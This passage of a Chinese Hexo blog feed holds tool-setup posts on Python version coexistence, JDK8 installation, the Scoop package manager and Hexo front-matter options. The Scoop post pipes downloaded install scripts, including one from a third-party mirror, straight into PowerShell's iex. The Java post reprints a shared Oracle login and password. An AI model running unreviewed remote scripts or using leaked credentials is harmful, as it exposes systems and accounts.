href="http://www.javashuo.com/article/p-snbrspvb-my.html">http://www.javashuo.com/article/p-snbrspvb-my.html</a></p></blockquote><ul><li>多个python版本共存问题</li></ul><p>python安装时，注意到环境变量path的配置是为了在命令行可以直接使用相关的.exe文件，</p><p>我们将python2.7和python3.8，目录都引入path中，再将两个目录下的python.exe，更名为python2.exe和python3.exe，这样在cmd中使用python时，不会冲突</p><p>另外需要修改在Windows起始栏的快捷位置：</p><p>注意目标位置和起始位置：这些都是要修改的，我只修改了python3的，因为python idle用python3来执行。如果要用python2，用命令行来执行</p><p>起始位置：”D:\Program Files (x86)\python3.8”</p><p>目标：”D:\Program Files (x86)\python3.8\pythonw.exe” “D:\Program Files (x86)\python3.8\Lib\idlelib\idle.pyw”</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180122330.png" alt="image-20220818012259063" style="zoom: 33%;" /><p>关于python2，因为其是以msi形式安装的，很难去修改路径，出了很多问题，所以改python.exe安装</p><p>艹了，妈的，python2和3都重装！！</p><ul><li>讲到Linux基础，我归纳入Linux学习部分</li><li>python3.8版本降低至3.6，怎么合理选择自己想要的python版本，怎么设置！？？</li></ul><blockquote><p><a href="https://blog.csdn.net/weixin_42919435/article/details/109523985">https://blog.csdn.net/weixin_42919435/article/details/109523985</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><ul><li>java安装时，jdk和jre尽量不在同一个目录</li><li>关于jdk8以上版本的jdk，jre文件夹是运行Java程序必不可少的运行环境，比如我们在玩Java版的Minecraft时就必须配置jre的路径。通常我们给用户使用的Java程序中都需要有jre来运行，我们自己做小项目时也是需要jre的。不走运的是新版本的jdk中似乎没有jre的存在，这是因为在Java8之后在安装jdk时便不再提供jre的安装，而是让我们根据自己的需要自行的安装，接下来我会展示如何自己安装jre文件夹（以Java11为例）。</li></ul><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_41219157/article/details/109667631">https://blog.csdn.net/qq_41219157/article/details/109667631</a></p></blockquote><h1 id="Windows安装JDK8"><a href="#Windows安装JDK8" class="headerlink" title="Windows安装JDK8"></a>Windows安装JDK8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过scoop安装</span><br><span class="line">scoop添加官方镜像源（如添加不成功可使用代理方式）</span><br><span class="line">1、通过命令 scoop bucket known 查看官方镜像</span><br><span class="line">2、添加官方包源 scoop bucket add java</span><br><span class="line">3、查看添加成功的源 scoop bucket list</span><br><span class="line">通过scoop安装 </span><br><span class="line">1、通过scoop搜索jdk scoop search jdk8</span><br><span class="line">2、选择对于版本进行下载安装</span><br><span class="line">3、验证安装</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">手动安装</span><br><span class="line">下载 JDK8</span><br><span class="line">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</span><br><span class="line">账号密码：https://blog.csdn.net/Virgil_K2017/article/details/90260880</span><br><span class="line">账号： liwei@xiaostudy.com </span><br><span class="line">密码： OracleTest1234</span><br><span class="line">安装 JDK8</span><br><span class="line">配置 PATH  环境变量</span><br><span class="line">Win + R  快捷键打开运行窗口，输入 sysdm.cpl  打开系统属性，选择高级，环境变量</span><br><span class="line"> </span><br><span class="line">新建如下环境变量及值：</span><br><span class="line">变量：Java_Home</span><br><span class="line">值：C:\Program Files\Java</span><br><span class="line"> </span><br><span class="line">变量：CLASSPATH</span><br><span class="line">值：.;%Java_Home%\jdk1.8.0_321\bin;%Java_Home%\jdk1.8.0_321\lib\dt.jar;%Java_Home%\jdk1.8.0_321\lib\tools.jar</span><br><span class="line"></span><br><span class="line">变量：Path</span><br><span class="line">值：%Java_Home%\jdk1.8.0_321\bin</span><br><span class="line">    %Java_Home%\jre1.8.0_321\bin</span><br><span class="line">验证安装</span><br><span class="line">Win + R  运行窗口输入 cmd  打开命令提示符，输入 java -version 、 javac -version</span><br></pre></td></tr></table></figure><h1 id="Linux安装JDK8"><a href="#Linux安装JDK8" class="headerlink" title="Linux安装JDK8"></a>Linux安装JDK8</h1><ol><li>切换linux java及javac版本：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换java：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">切换javac：</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.xsot.cn/archives/illegalreflective.html">https://blog.xsot.cn/archives/illegalreflective.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">包管理器安装（新手推荐）：</span><br><span class="line"><span class="comment"># centos、redhat等</span></span><br><span class="line">yum -y list java*</span><br><span class="line">yum install java-1.8.0-openjdk* -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># debian、ubuntu、kali等</span></span><br><span class="line">apt-cache search java | grep jdk</span><br><span class="line">apt install openjdk-8-jre-headless</span><br><span class="line">apt install openjdk-8-jdk-headless</span><br><span class="line">apt install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line">源码安装（新手不推荐）：</span><br><span class="line">mdkir /usr/java</span><br><span class="line"><span class="built_in">cd</span> /usr/java</span><br><span class="line">tar -zxvf jdk-8u241-linux-x64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> jdk-1.8._241 jdk8</span><br><span class="line">vim /etc/profile    <span class="comment"># 编辑profile配置文件，添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk8</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:<span class="variable">$CLASSPATH</span></span><br><span class="line"><span class="built_in">export</span> JAVA_PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_PATH&#125;</span></span><br><span class="line"></span><br><span class="line">验证安装：</span><br><span class="line"><span class="built_in">source</span> /etc/profile        <span class="comment">#让配置生效</span></span><br><span class="line">java --version</span><br></pre></td></tr></table></figure><h1 id="Mac安装JDK8"><a href="#Mac安装JDK8" class="headerlink" title="Mac安装JDK8"></a>Mac安装JDK8</h1><blockquote><p>Java Downloads | Oracle: <a href="https://www.oracle.com/java/technologies/downloads/#java8-mac">https://www.oracle.com/java/technologies/downloads/#java8-mac</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">vim  .bash_profile</span><br><span class="line"><span class="built_in">export</span> </span><br><span class="line">JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/(java安装目录)</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scoop 包管理器</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Scoop简介"><a href="#Scoop简介" class="headerlink" title="Scoop简介"></a>Scoop简介</h1><blockquote><p>更多信息查看官网：<a href="https://scoop.sh/">https://scoop.sh</a></p></blockquote><p>Windows命令行包管理工具</p><ul><li>命令行安装软件</li><li>命令行管理软件</li><li>自动配置环境变量</li><li>自动管理程序依赖</li></ul><h1 id="Scoop安装"><a href="#Scoop安装" class="headerlink" title="Scoop安装"></a>Scoop安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在 PowerShell 中打开远程权限</span><br><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser;</span><br><span class="line">2. 自定义 Scoop 安装目录</span><br><span class="line">$env:SCOOP=&#x27;D:\scoop&#x27;</span><br><span class="line"># 用户环境变量</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)</span><br><span class="line"># 系统环境变量</span><br><span class="line"># [Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;)</span><br><span class="line">如果跳过该步骤， Scoop 将默认把所有用户安装的 App 和 Scoop 本身置于 C:\Users\user_name\scoop</span><br><span class="line">3. 下载并安装 Scoop</span><br><span class="line">iwr -useb get.scoop.sh | iex</span><br><span class="line">Initializing...</span><br><span class="line">Downloading...</span><br><span class="line">Extracting...</span><br><span class="line">Creating shim...</span><br><span class="line">Adding D:\scoop\shims to your path.</span><br><span class="line">Scoop was installed successfully!</span><br><span class="line">Type &#x27;scoop help&#x27; for instructions.</span><br><span class="line">scoop update</span><br><span class="line">==+国内镜像</span><br><span class="line">iwr -useb https://gitee.com/glsnames/scoop-installer/raw/master/bin/install.ps1 </span><br><span class="line">| iex</span><br><span class="line">scoop config SCOOP_REPO &#x27;https://gitee.com/glsnames/scoop-installer&#x27;</span><br><span class="line">scoop update</span><br><span class="line">4. 安装软件包</span><br><span class="line">scoop install &lt;app_name&gt;</span><br><span class="line">scoop install sudo</span><br><span class="line">5. 查看 Scoop 使用简介</span><br><span class="line">scoop help</span><br><span class="line">alias       管理 scoop 别名</span><br><span class="line">bucket      管理 Scoop buckets</span><br><span class="line">cache       显示或清除下载缓存</span><br><span class="line">cat         显示指定清单的内容。如果有的话，`bat&#x27;将被用于漂亮地打印JSON。</span><br><span class="line">checkup     检查潜在问题</span><br><span class="line">cleanup     通过删除旧版本清理应用程序</span><br><span class="line">config      获取或设置配置值</span><br><span class="line">create      创建自定义应用程序清单</span><br><span class="line">depends     列出一个应用程序的依赖项</span><br><span class="line">download    下载缓存文件夹中的应用程序并验证哈希值</span><br><span class="line">export      导出（可导入）已安装的应用程序的列表</span><br><span class="line">help        显示一个命令的帮助</span><br><span class="line">hold        按住一个应用程序以禁用更新</span><br><span class="line">home        打开应用程序的主页</span><br><span class="line">info        显示一个应用程序的信息</span><br><span class="line">install     安装应用</span><br><span class="line">list        列出已安装的应用程序</span><br><span class="line">prefix      返回指定应用程序的路径</span><br><span class="line">reset       重置一个应用程序以解决冲突</span><br><span class="line">search      搜索可用的应用程序</span><br><span class="line">shim        操纵Scoop shims</span><br><span class="line">status      显示状态并检查新的应用程序版本</span><br><span class="line">unhold      解除对一个应用程序的控制，使其能够更新</span><br><span class="line">uninstall   卸载一个应用程序</span><br><span class="line">update      新应用程序或Scoop本身</span><br><span class="line">virustotal  在virustotal.com上寻找应用程序的哈希值</span><br><span class="line">which       找到一个shim/executable（类似于Linux上的&#x27;which&#x27;）</span><br></pre></td></tr></table></figure><h1 id="Scoop使用"><a href="#Scoop使用" class="headerlink" title="Scoop使用"></a>Scoop使用</h1><ol><li>添加bucket</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># powershell添加代理</span><br><span class="line">$Env:HTTP_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">$Env:HTTPS_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># cmd添加代理</span><br><span class="line">set http_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">set https_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># 添加 bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 列出添加的 bucket</span><br><span class="line">scoop bucket list</span><br><span class="line">Name Source                                 Updated           Manifests</span><br><span class="line">---- ------                                 -------           ---------</span><br><span class="line">main https://github.com/ScoopInstaller/Main 2022/5/3 20:31:35      1015</span><br><span class="line"># 查看官方推荐的 bucket</span><br><span class="line">scoop bucket known</span><br><span class="line">main</span><br><span class="line">extras</span><br><span class="line">versions</span><br><span class="line">nirsoft</span><br><span class="line">php</span><br><span class="line">nerd-fonts</span><br><span class="line">nonportable</span><br><span class="line">java</span><br><span class="line">games</span><br></pre></td></tr></table></figure><ol start="2"><li>安装应用：以 7zip  为例</li></ol><blockquote><p><a href="https://scoop.sh/#/apps?q=7zip">https://scoop.sh/#/apps?q=7zip</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索 7zip 应用</span><br><span class="line">scoop search 7zip</span><br><span class="line">&#x27;main&#x27; bucket:</span><br><span class="line">    7zip (21.07)</span><br><span class="line">    7zip19.00-helper (19.00)</span><br><span class="line"># 添加 main bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 安装 7zip</span><br><span class="line">scoop install 7zip</span><br><span class="line">Installing &#x27;7zip&#x27; (21.07) [64bit]</span><br><span class="line">7z2107-x64.msi (1.8 MB) </span><br><span class="line">[===============================================================================</span><br><span class="line">======] 100%</span><br><span class="line">Checking hash of 7z2107-x64.msi ... ok.</span><br><span class="line">Extracting 7z2107-x64.msi ... done.</span><br><span class="line">Linking D:\scoop\apps\7zip\current =&gt; D:\scoop\apps\7zip\21.07</span><br><span class="line">Creating shim for &#x27;7z&#x27;.</span><br><span class="line">Creating shortcut for 7-Zip (7zFM.exe)</span><br><span class="line">Persisting Codecs</span><br><span class="line">Persisting Formats</span><br><span class="line">Running post-install script...</span><br><span class="line">&#x27;7zip&#x27; (21.07) was installed successfully!</span><br><span class="line">Notes</span><br><span class="line">-----</span><br><span class="line">Add 7-Zip as a context menu option by running: </span><br><span class="line">&quot;D:\scoop\apps\7zip\current\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看 scoop 安装的应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop list</span><br><span class="line">Installed apps:</span><br><span class="line">Name Version Source Updated             Info</span><br><span class="line">---- ------- ------ -------             ----</span><br><span class="line">7zip 21.07   main   2022-05-03 23:05:15</span><br></pre></td></tr></table></figure><ol start="4"><li>查看应用信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop status 7zip</span><br><span class="line">scoop info 7zip</span><br><span class="line">Name        : 7zip</span><br><span class="line">Description : A multi-format file archiver with high compression ratios</span><br><span class="line">Version     : 21.07</span><br><span class="line">Bucket      : main</span><br><span class="line">Website     : https://www.7-zip.org</span><br><span class="line">License     : LGPL-2.1-or-later</span><br><span class="line">Updated at  : 2022/4/4 17:24:43</span><br><span class="line">Updated by  : Issac Lin</span><br><span class="line">Installed   : 21.07</span><br><span class="line">Binaries    : 7z.exe</span><br><span class="line">Shortcuts   : 7-Zip</span><br><span class="line">Notes       : Add 7-Zip as a context menu option by running: &quot;&lt;root&gt;\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="5"><li>Scoop更新应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 更新scoop</span><br><span class="line">scoop update</span><br><span class="line"># 更新7zip</span><br><span class="line">scoop update 7zip</span><br><span class="line"># 更新全部</span><br><span class="line">scoop *</span><br></pre></td></tr></table></figure><ol start="6"><li>卸载删除应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop uninstall 7zip</span><br><span class="line">Uninstalling &#x27;7zip&#x27; (21.07).</span><br><span class="line">Removing shim &#x27;7z.shim&#x27;.</span><br><span class="line">Removing shim &#x27;7z.exe&#x27;.</span><br><span class="line">Removing shortcut ~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Scoop Apps\7-Zip.lnk</span><br><span class="line">Unlinking D:\scoop\apps\7zip\current</span><br><span class="line">&#x27;7zip&#x27; was uninstalled.</span><br></pre></td></tr></table></figure><h1 id="Scoop下载加速"><a href="#Scoop下载加速" class="headerlink" title="Scoop下载加速"></a>Scoop下载加速</h1><ol><li>安装 Aria2 来加速下载</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install aria2</span><br></pre></td></tr></table></figure><ol start="2"><li>如果使用代理，有时需要通过如下命令关闭 aria2</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled false</span><br></pre></td></tr></table></figure><ol start="3"><li>aria2 在 Scoop 中默认开启</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled true</span><br></pre></td></tr></table></figure><ol start="4"><li>其他参数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-retry-wait 4</span><br><span class="line">scoop config aria2-split 16</span><br><span class="line">scoop config aria2-max-connection-per-server 16</span><br><span class="line">scoop config aria2-min-split-size 4M</span><br></pre></td></tr></table></figure><h1 id="Scoop调用管理员"><a href="#Scoop调用管理员" class="headerlink" title="Scoop调用管理员"></a>Scoop调用管理员</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install sudo </span><br><span class="line">sudo cmd.exe</span><br></pre></td></tr></table></figure><h1 id="Scoop其他bucket"><a href="#Scoop其他bucket" class="headerlink" title="Scoop其他bucket"></a>Scoop其他bucket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">scoop update</span><br></pre></td></tr></table></figure><h1 id="Scoop创建安装程序"><a href="#Scoop创建安装程序" class="headerlink" title="Scoop创建安装程序"></a>Scoop创建安装程序</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop create url</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;:  &quot;&quot;,  // 版本</span><br><span class="line">    &quot;license&quot;:  &quot;&quot;,</span><br><span class="line">    &quot;extract_dir&quot;:  &quot;&quot;, // 解压目录</span><br><span class="line">    &quot;url&quot;:  &quot;&quot;,  下载url地址</span><br><span class="line">    &quot;homepage&quot;:  &quot;&quot;,  // 官网主页</span><br><span class="line">    &quot;hash&quot;:  &quot;&quot;,  // 安装文件或压缩包sha256 hash值</span><br><span class="line">    &quot;bin&quot;:  &quot;&quot; // 应用程序名</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoop install .\app.json</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 包管理器 </tag>
            
            <tag> scoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x01 - 环境搭建</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-写作markdown内的配置</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<ul><li><p>Front-matter</p><blockquote><p>Front-matter 是 markdown 文件最上方以 — 分隔的区域，用于指定个别档案的变数。</p><blockquote><p>Page Front-matter 用于页面配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】页面标题</span><br><span class="line">date【必需】页面创建日期</span><br><span class="line">type【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">updated【可选】页面更新日期</span><br><span class="line">description【可选】页面描述</span><br><span class="line">keywords【可选】页面关键字</span><br><span class="line">comments【可选】显示页面评论模块(默认 true)</span><br><span class="line">top_img【可选】页面顶部图片</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br></pre></td></tr></table></figure><p>Post Front-matter 用于文章页配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】文章标题</span><br><span class="line">date【必需】文章创建日期</span><br><span class="line">updated【可选】文章更新日期</span><br><span class="line">tags【可选】文章标籤</span><br><span class="line">categories【可选】文章分类</span><br><span class="line">keywords【可选】文章关键字</span><br><span class="line">description【可选】文章描述</span><br><span class="line">top_img【可选】文章顶部图片</span><br><span class="line">cover【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">comments【可选】显示文章评论模块(默认 true)</span><br><span class="line">toc【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc_number【可选】显示toc_number(默认为设置中toc的number配置)</span><br><span class="line">toc_style_simple【可选】显示 toc 简洁模式</span><br><span class="line">copyright【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">top:置顶</span><br><span class="line">sticky: 1你可以直接在文章的front-matter区域里添加属性来把这篇文章置顶。数值越大，置顶的优先级越大。</span><br><span class="line">toc_max_depth:最大几级目录</span><br><span class="line">link:标题的链接</span><br><span class="line">photos:</span><br></pre></td></tr></table></figure></blockquote></blockquote></li><li><p>文章页 的 top_img ，请到对应的 md 页面，设置front-matter中的top_img</p></li></ul><p>属性值：</p><blockquote><ul><li><p>留空</p></li><li><p>true - 可选择颜色：</p><blockquote><ul><li><p>HEX值 - #0000FF</p></li><li><p>RGB值 - rgb(0,0,255)</p></li><li><p>顔色单词 - orange</p></li><li><p>渐变色 - linear-gradient( 135deg, #E2B0FF 10%, #9F44D3 100%)</p><p>​  linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)</p></li></ul></blockquote></li><li><p>false - 显示默认的顔色</p></li><li><p>transparent - 透明</p></li><li><p>img链接：相对或者绝对路径</p></li></ul></blockquote><ul><li><p>文章封面:文章的markdown文档上,在Front-matter添加cover,并填上要显示的图片地址。如果不配置cover,可以设置显示默认的cover.(已经设置了很多张随机了~~)</p></li><li><p>如果有文章（例如：转载文章）不需要显示版权，可以在文章Front-matter单独设置<code>copyright: false</code></p></li><li><p>在文章页，会有一个目录，用于显示TOC。可以为特定的文章配置，在你的文章md文件的头部，加入toc_number和toc，并配置true或者false即可。主题会优先判断文章Markdown的Front-matter是否有配置，如有，则以Front-matter的配置为准。否则，以主题配置文件中的配置为准</p></li><li><p>如果你需要展示的内容太多，可以把它隐藏在收缩框里，需要时再把它展开。( display 不能包含英文逗号，可用&amp;sbquo;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% hideToggle display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">&#123;% hideToggle Butterfly安装方法 %&#125;</span><br><span class="line">在你的博客根目录里</span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">如果想要安装比较新的dev分支，可以</span><br><span class="line">git clone -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br></pre></td></tr></table></figure></li><li><p>Tabs使用方法</p></li></ul><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line"><span class="code">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span></span><br><span class="line"><span class="code">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span></span><br><span class="line"><span class="code">                Only for current url of post/page must be unique!</span></span><br><span class="line"><span class="code">[index]       : Index number of active tab.</span></span><br><span class="line"><span class="code">                If not specified, first tab (1) will be selected.</span></span><br><span class="line"><span class="code">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[Tab caption] : Caption of current tab.</span></span><br><span class="line"><span class="code">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span></span><br><span class="line"><span class="code">                If not caption specified, but specified icon, caption will empty.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span></span><br><span class="line"><span class="code">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br></pre></td></tr></table></figure><p>Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><ul><li>评论数据管理</li></ul><p>由于Valine 是无后端评论系统，所以也就没有开发评论数据管理功能。请自行登录<code>Leancloud应用</code>管理。</p><p>具体步骤：<code>登录</code>&gt;<code>选择你创建的应用</code>&gt;<code>存储</code>&gt;选择Class <code>Comment</code>，然后就可以尽情的发挥你的权利啦(～￣▽￣)～</p><blockquote><p>当然，你也可以配合 <a href="https://github.com/DesertsP">@DesertsP</a> 开发的 <a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a> 进行<code>评论数据管理</code></p></blockquote><p>注意事项</p><p>在 Hexo 博客中，评论的功能在所有页面都默认开启，但是有的时候我们在页面上不需要显示评论功能，例如分类，标记页面我们并不需要评论功能。</p><p>在 <code>Front-matter</code> 中通过<code>comments</code>属性设置<code>true</code>或<code>false</code>控制该页面或者是文章的评论功能是否打开，如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Tags</span><br><span class="line">date: 2019-12-19 16:10:19</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><ul><li>hexo设置永久文内链接，自定义跳转到本站的其他博客：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 文章文件名(不要后缀) 显示文字(可自定义，一般写文章标题) 